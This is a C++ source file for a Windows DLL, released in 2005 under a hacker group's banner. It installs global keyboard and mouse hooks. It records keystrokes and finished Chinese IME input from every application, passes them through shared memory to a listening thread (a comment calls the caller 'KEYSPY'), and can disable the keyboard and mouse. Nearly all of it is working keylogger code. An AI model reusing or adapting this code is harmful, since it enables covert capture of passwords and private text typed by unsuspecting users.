/*---------------------------------------------------------------------------
FileName:HookDll.cpp
Usage:Hook Library V1.2
发布： 火狐技术联盟[F.S.T] 2005/10/08
网站:http://www.wrsky.com
版权：原作者所有
----------------------------------------------------------------------------*/
#include "stdafx.h"
#include <stdio.h>
#include <imm.h>
#pragma comment(lib,"imm32.lib") 
#define HOOKDLL_API __declspec(dllexport)
#define WM_KEYHOOK       WM_USER+100 //键盘消息
#define WM_MSHOOK        WM_USER+101 //鼠标消息
#define WM_KEYHOOK_CN    WM_USER+102 //中文键盘消息
#define WM_KEYHOOK_CN_EN WM_USER+103 //中英钩子
#pragma data_seg(".inidata")
//HWND APP_hdl;                       //用来保存调用程序窗口句柄
static HINSTANCE hdll_lib;                   //用来保存该动态连接库的句柄
static HHOOK KBhookEn,KBhookCn,MShook;                  //钩子句柄
static bool DisableKB,DisableMS,KBStart,MSStart;
static int MSthreadid,KBthreadid;
#pragma data_seg() 
//


//--------------------------------------------------------------
extern "C" HOOKDLL_API void SetKBHook(void);
extern "C" HOOKDLL_API void SetKBHookCn(void);
extern "C" __declspec(dllexport) void RemoveKBHook(void);
extern "C" __declspec(dllexport) void SetMSHook(void);
extern "C" __declspec(dllexport) void RemoveMSHook(void);
extern "C" __declspec(dllexport) void DisableKeyBoard(bool flag);
extern "C" __declspec(dllexport) void DisableMouse(bool flag);
extern "C" __declspec(dllexport) void StartKBHook();
extern "C" __declspec(dllexport) void StartMSHook();
extern "C" __declspec(dllexport) void StopKBHook();
extern "C" __declspec(dllexport) void StopMSHook();
extern "C" __declspec(dllexport) void SetKBHookThreadId(int threadid);
extern "C" __declspec(dllexport) void SetMSHookThreadId(int threadid); 
//--------------------------------------------------------------                               
LRESULT CALLBACK KBhook_deal(int nCode,WPARAM wParam,LPARAM lParam);//键盘钩子回调函数
LRESULT CALLBACK KBhookCn_deal(int nCode,WPARAM wParam,LPARAM lParam);//支持中文的键盘钩子回调函数
LRESULT CALLBACK MShook_deal(int nCode,WPARAM wParam,LPARAM lParam);//鼠标钩子回调函数
                                    //DLL的入口函数
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
  switch(ul_reason_for_call){
    case DLL_PROCESS_ATTACH://单线程构造函数
          hdll_lib=(HINSTANCE)hModule; //保存自身DLL句柄
          break;
    case DLL_PROCESS_DETACH://单线程析构函数
         break;
    default:
         break;
    }
    return TRUE;
}
/*---------------------------键盘钩子设置函数-----------------------------------*/
extern "C" __declspec(dllexport) void SetKBHook(void){
  if(KBhookEn==NULL)
     KBhookEn=SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KBhook_deal,hdll_lib,0);//设置全局钩子
}
/*---------------------------键盘钩子设置函数[支持中文]-----------------------------------*/
extern "C" __declspec(dllexport) void SetKBHookCn(void){
  if(KBhookCn==NULL)
     KBhookCn=SetWindowsHookEx(WH_GETMESSAGE,(HOOKPROC)KBhookCn_deal,hdll_lib,0);//设置全局钩子
}
/*---------------------------键盘钩子卸载函数-----------------------------------*/
extern "C" __declspec(dllexport) void RemoveKBHook(void){
  if(KBhookCn)
    UnhookWindowsHookEx(KBhookCn); //卸载钩子
  if(KBhookEn)
    UnhookWindowsHookEx(KBhookEn); //卸载钩子
}
/*--------------------------键盘钩子回调函数定义--------------------------------*/
LRESULT CALLBACK KBhook_deal(int nCode,WPARAM wParam,LPARAM lParam){
  if(nCode<0) return(CallNextHookEx(KBhookEn,nCode,wParam,lParam)); //将信息传递给下一个钩子
  //SendMessage(APP_hdl,WM_KEYHOOK,wParam,lParam);                //向KEYSPY调用程序发送信息
  HANDLE hThreadid=OpenFileMapping(FILE_MAP_WRITE,false,"Threadid");
  if(hThreadid){
    int *pThreadid=(int *)MapViewOfFile(hThreadid,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
    if(pThreadid) KBthreadid=*pThreadid;
    }
  else MessageBox(NULL,"no find meme","no",MB_OK);
  if(true){
    PostThreadMessage(KBthreadid,WM_KEYHOOK,wParam,lParam);         //向线程发送消息
	}
  //else MessageBox(NULL,"false","false",MB_OK);
  if(DisableKB) return 1;
  return 0;
}
/*--------------------------键盘钩子回调函数定义[支持中文]--------------------------------*/
LRESULT CALLBACK KBhookCn_deal(int nCode,WPARAM wParam,LPARAM lParam){
  HIMC hIMC;
  HWND hWnd;
  char *pCNString;
  LRESULT lResult = CallNextHookEx(KBhookCn, nCode, wParam, lParam);
  PMSG pmsg = (PMSG)lParam;
  hWnd=pmsg->hwnd;
  if(nCode != HC_ACTION) return 0;
  HANDLE hThreadid=OpenFileMapping(FILE_MAP_WRITE,false,"Threadid");
  if(hThreadid){
     int *pThreadid=(int *)MapViewOfFile(hThreadid,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
     if(pThreadid) KBthreadid=*pThreadid;
     }
  else MessageBox(NULL,"no find threadid","no",MB_OK);
  /* this code from ZWELL 获得输入法处理后的字符串 */
  ///*
  if(pmsg->message==WM_IME_COMPOSITION){
            /*MessageBox(NULL,"get it cn","sdf",MB_OK);*/
            HANDLE hCNString=OpenFileMapping(FILE_MAP_WRITE,false,"CNString");
            if(hCNString) pCNString=(char *)MapViewOfFile(hCNString,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
            else return 0;
            if(pCNString==NULL) {/*MessageBox(NULL,"no cn","ff",MB_OK);*/return 0;}
            DWORD dwSize;
            char lpstr[128];
            if(pmsg->lParam & GCS_RESULTSTR){
                 //先获取当前正在输入的窗口的输入法句柄
                 hIMC = ImmGetContext(hWnd);
                 if(!hIMC)  return 0;
                 // 先将ImmGetCompositionString的获取长度设为0来获取字符串大小.
                 dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);
                 // 缓冲区大小要加上字符串的NULL结束符大小,
                 // 考虑到UNICODE
                 dwSize += sizeof(WCHAR);
                 memset(lpstr, 0, sizeof(lpstr));
                 // 再调用一次.ImmGetCompositionString获取字符串
                 ImmGetCompositionString(hIMC, GCS_RESULTSTR, lpstr, dwSize);
                 //现在lpstr里面即是输入的汉字了。你可以处理lpstr,当然也可以保存为文件...
                 //MessageBox(NULL, lpstr, lpstr, MB_OK); 
                 strncpy(pCNString,lpstr,sizeof(lpstr));
                 ImmReleaseContext(hWnd, hIMC);
                 PostThreadMessage(KBthreadid,WM_KEYHOOK_CN_EN,wParam,lParam);         //向线程发送消息
                 }
             //if (pCNString) UnmapViewOfFile(pCNString);
             //if (hCNString) CloseHandle(hCNString);
            }
  //*/
  /* code from ZWELL end */
  if(pmsg->message==WM_CHAR||pmsg->message==WM_KEYDOWN){
            if(pmsg->message==WM_KEYDOWN){
               unsigned char ch=(unsigned char)(pmsg->wParam);
               if((ch>=0x21&&ch<=0x28)||(ch>=0x70&&ch<=0x7b)||ch==0x2d||ch==0x2e||ch==0x5b);
               else return 0;
               }
            //	WM_CHAR对应可显示字符键的消息，WM_KEYDOWN对应控制键消息
            /*
            if(ImmIsIME(GetKeyboardLayout(0))){                       //判断中文输入法
              if((unsigned char)(pmsg->wParam)>0x7F){
                //MessageBox(NULL,"quit","char",MB_OK);
                return 0;
                }
              }
            strncpy(pCNString,(char *)&(pmsg->wParam),1);
            */
            lParam=pmsg->lParam;//扫描吗
            wParam=pmsg->wParam;//虚拟码
            char str[20]={0};
            sprintf(str,"0x=%x",(unsigned char)pmsg->wParam);
            //MessageBox(NULL,str,"char",MB_OK);
            PostThreadMessage(KBthreadid,WM_KEYHOOK_CN,wParam,lParam);         //向线程发送消息
            }
  if(DisableKB) return 1;
  return 0;
}
//==============================================================================
/*---------------------------鼠标钩子设置函数-----------------------------------*/
extern "C" __declspec(dllexport) void SetMSHook(void){
  if(MShook==NULL)
     MShook=SetWindowsHookEx(WH_MOUSE,(HOOKPROC)MShook_deal,hdll_lib,0);//设置全局钩子
}
/*---------------------------鼠标钩子卸载函数-----------------------------------*/
extern "C" __declspec(dllexport) void RemoveMSHook(void){
  if(MShook)
    UnhookWindowsHookEx(MShook); //卸载钩子
}
/*--------------------------鼠标钩子回调函数定义--------------------------------*/
LRESULT CALLBACK MShook_deal(int nCode,WPARAM wParam,LPARAM lParam){
  if(nCode<0) return(CallNextHookEx(MShook,nCode,wParam,lParam)); //将信息传递给下一个钩子
  //SendMessage(APP_hdl,WM_KEYHOOK,wParam,lParam);                //向KEYSPY调用程序发送信息
  if(MSStart) PostThreadMessage(MSthreadid,WM_MSHOOK,wParam,lParam);          //向线程发送消息
  if(DisableMS) return 1;
  return 0;
}
/*--------------------------废除键盘--------------------------------*/
extern "C" __declspec(dllexport) void DisableKeyBoard(bool flag){
DisableKB=flag;
}
/*--------------------------废除鼠标--------------------------------*/
extern "C" __declspec(dllexport) void DisableMouse(bool flag){
DisableMS=flag;
}
/*--------------------------处理键盘钩子信息--------------------------------*/
extern "C" __declspec(dllexport) void StartKBHook(){
KBStart=true;
}
/*--------------------------处理鼠标钩子信息--------------------------------*/
extern "C" __declspec(dllexport) void StartMSHook(){
MSStart=true;
}
/*--------------------------停止键盘钩子处理--------------------------------*/
extern "C" __declspec(dllexport) void StopKBHook(){
KBStart=false;
}
/*--------------------------停止鼠标钩子处理--------------------------------*/
extern "C" __declspec(dllexport) void StopMSHook(){
MSStart=false;
}
/*--------------------------设置键盘钩子消息发送线程ID--------------------------------*/
extern "C" __declspec(dllexport) void SetKBHookThreadId(int threadid){
KBthreadid=threadid;
}
/*--------------------------设置鼠标钩子消息发送线程ID--------------------------------*/
extern "C" __declspec(dllexport) void SetMSHookThreadId(int threadid){
MSthreadid=threadid;
}
